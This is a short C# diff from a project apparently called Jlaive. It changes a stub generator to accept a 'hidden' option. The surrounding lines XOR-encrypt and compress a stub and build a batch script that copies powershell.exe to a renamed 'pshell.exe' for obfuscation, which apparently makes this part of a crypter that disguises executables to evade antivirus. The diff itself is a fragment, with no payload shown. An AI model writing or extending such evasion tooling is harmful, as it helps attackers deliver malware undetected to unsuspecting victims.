@@ -2,7 +2,6 @@
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Text;
 using System.Windows.Forms;
 using Microsoft.CSharp;
@@ -69,7 +68,7 @@ namespace Jlaive
 
             string key = RandomString(20, rng);
             byte[] encrypted = XORCrypt(Compress(stubbytes), key);
-            string command = StubGen.CreatePS(key, rng);
+            string command = StubGen.CreatePS(key, hidden.Checked, rng);
             StringBuilder toobf = new StringBuilder();
             toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
             toobf.AppendLine("cls");
